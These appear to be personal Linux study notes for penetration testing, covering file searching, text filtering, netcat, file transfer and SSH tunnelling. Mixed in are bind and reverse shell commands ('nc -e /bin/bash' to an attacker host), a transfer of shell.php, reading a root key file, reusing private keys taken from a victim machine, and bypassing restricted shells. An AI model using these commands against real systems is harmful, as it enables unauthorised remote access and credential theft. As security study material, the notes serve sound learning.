# Linux basics

A list of commands and techniques that are useful for getting around the file system and enumerating. I'm writing them down because they're easy to forget or mix up.

## Finding things

There are some basic commands to find files and executables, but each one works differently.

### Locate

Search against an index which must be updated periodically:

```text
updatedb
locate nc.exe
```

### Which

Search through directories defined in the `$PATH` environment variable:

```text
which gcc
```

### Find

Search recursively through directories:

```text
find / -name cron*
```

### Ls

Never use the basic command, always list directory contents showing owner and including dot files like `bash_history`:

```text
ls -la
-rw-------    1 joe  staff   6863 26 Sep 17:12 .bash_history
-rw-r--r--    1 joe  staff    200 23 Jul 14:36 .bash_profile
drwx------  129 joe  staff   4128  1 Oct 15:41 .bash_sessions
```

## Basic Bash scripting

This isn't even really Bash scripting, it's more about how to chain commands together to do useful things.

### Filter

Being able to process text-based files and pull out useful data is a useful skill. For example, to filter out domain names from an HTML file full of other stuff, you can `grep` for something uniquely associated with URLs, then cut out extraneous information:

```text
<li><a href="http://newsroom.cisco.com/">Newsroom</a></li> # links you'd find in HTML

grep "href=" file.html | cut -d "/" -f 3
```

In the above example, we are grepping for `href=` which identifies hyperlinks in HTML. We can filter more precisely by looking for recurring characters that help us divide the data into smaller chunks. The command `cut -d "/"` chunks the data and separates it by `/`. The `-f 3` option tells us to filter out the 3rd chunk \(field\) of data.

### Sort

Find unique items in a list with duplicates using `sort -u`:

```text
grep "href=" file.html | cut -d "/" -f 3 | sort -u
```

### Simple loop

Run the `host` command on every domain in a text file:

```text
for url in $(cat list.txt); do host $url; done
```

Grep the output of `host` to find successful lookups:

```text
for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u
```

In the above example, you're looking for lines with `has address`, filtering out the URL by using spaces as the delimiter and then removing duplicates with `sort`.

### Directing output

Direct output to a file with `>`:

```text
cat /root/key.txt > /tmp/key.txt
```

Append output to a file with `>>`:

```text
cat /root/key.txt >> /tmp/key.txt
```

Direct output to another command with `|`:

```text
grep "href=" file.html | cut -d "/" -f 3
```

## Netcat

### Connect to a port

Connect to an open TCP or UDP port \(e.g. mail service\) to see if it responds:

```text
nc -nv [host] 110
(UNKNOWN) [host] 110 (pop3) open
+OK POP3 server ready
```

### Bind shell

Bob \(Windows\) wants Alice \(Linux\) to connect to his computer remotely and issue commands. Bob sets up a listener which allows anyone connect to port 443 to issue commands via `cmd.exe`:

```text
nc -nlvp 443 -e cmd.exe
```

Alice then connects to Bob's machine and gets a Windows command prompt:

```text
nc -nv [bob] 443
```

### Reverse shell

Netcat can also send a command shell to a listening host. Let's say Alice \(Linux\) wants Bob \(Windows\) to issue remote commands to her computer.

Bob sets up a listener on his machine:

```text
nc -nlvp 443
listening on [any] 443...
```

Alice then sends control of her command prompt to Bob's machine, via netcat:

```text
nc -nv [bob] 443 -e /bin/bash
```

This is what hackers mean by popping shells, but usually it's getting a web server/desktop to send a reverse shell to your attack machine.

## Ncat

It's like netcat, but can encrypt connections and restrict access.

Taking the example of Bob \(Windows\) setting up a bind shell so that only Alice \(Linux\) could connect to it via SSL, his listener would look like this:

```text
ncat --exec cmd.exe --allow [alice] -vnl 443 --ssl
```

Alice would connect securely to Bob:

```text
ncat -v [bob] 443 --ssl
```

## File transfer

### Python

You'll use python's web server all the time to transfer exploits and move files between machines \(or possibly even within machines\). Pay attention to the port you use, as it may interfere with shells or firewalls:

```text
cd exploits
python -m SimpleHTTPServer 80
```

### Netcat

To transfer files, set up a listener and redirect the output to a filename:

```text
nc -nlvp 443 > nc.exe # receiving machine
listening on [any] 443...

nc -nv [host] 443 < nc.exe # sending machine pushes file
(UNKNOWN) [host] 443 (?) open
```

### Wget

Download files from another machine:

```text
wget [host]:8080/test.txt
```

### Curl

Download files from another machine, such as webpages:

```text
curl -O http://[host]/file.txt
```

### TFTP

TFTP works more or less like FTP:

```text
tftp [host]
tftp> get file.txt
```

If it can't be run interactively, this one-liner might work:

```text
tftp [host] <<< "get shell.php shell.php"
```

### SCP

Copy a file:

```text
scp /path/to/source/file.ext username@host:/path/to/destination/file.ext
```

Copy a directory:

```text
scp -r /path/to/source/dir username@host:/path/to/destination
```

## SSH

SSH is surprisingly powerful and does way more than simply connecting you to remote machines.

### Basic usage

SSH with a username:

```text
ssh username@[host]
```

SSH with a private key:

```text
cd Desktop
ssh -i /root/Desktop/keyfile username@[host]
```

If you find a private key in a victim machine \(usually in `home/user/.ssh/id_rsa`\) you can paste the keyfile contents into a text file on your local machine, set the right permissions with `chmod 600` and ssh in with it.

### Local port forwarding

Port forwarding can be tricky to understand, even with examples. There is a retired machine called Poison on Hack the Box which uses port forwarding. Reading some of the walkthroughs and attempting to exploit the machine does make things clearer.

But I still don't entirely get it, even though I've used the technique a few times. So maybe this section is wrong, lol.

Sometimes a service can only be accessed locally, for security reasons. The port might be open, but it will not accept remote connections. Let's say you have VNC running on a remote server and listening on the loopback interface \(allows client software to communicate with server software on the same computer, usually with IP address `127.0.0.1` or `localhost`\). To access this local-only service from your remote machine, you'll need to instruct SSH to forward connections from your machine's local port `5901` to the server's loopback interface + listening port for VNC: `127.0.0.1:5901`.

This is the SSH command to forward your local port to the remote host's loopback interface:

```text
ssh -L 5901:127.0.0.1:5901 username@[host]
```

Once that connection is established, open a second terminal window and connect to the remote VNC service as if you were on the same box:

```text
xtightvncviewer 127.0.0.1:5901
```

So the first command instructs SSH to forward any connections from your machine's local port `5901` to `127.0.0.1:5901` on the remote host. Because of this tunnel, the second command lets you connect VNC service as if you were on the same server.

Here's [another example](https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html) using different local and remote ports: let's say you have PostgreSQL running on a remote server which can only be accessed from `localhost` on port `5432`.

To forward connections from your local port `9000` to `localhost:5432` on the remote server:

```text
ssh -L 9000:localhost:5432 username@[host]
```

Then you would access the PostgreSQL admin console using this command, as if you were on the remote server:

```text
psql -h localhost -p 9000
```

### Bypassing restricted shells

SSH is one method of bypassing restricted shells \(see Further Reading for more\).

SSH in using a key, but without loading the restricted profile:

```text
ssh -i keyfile username@[host] -t "bash --noprofile"
```

SSH in, but execute some commands before the remote shell is created:

```text
ssh -i keyfile username@[host] -t "/bin/sh"
```

## Further reading

* [Linux Journey](https://linuxjourney.com/)
* [Netcat options](https://resources.infosecinstitute.com/netcat-uses/)
* [Ncat options](https://nmap.org/book/ncat-man-options-summary.html)
* [Bypassing restricted shells](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)

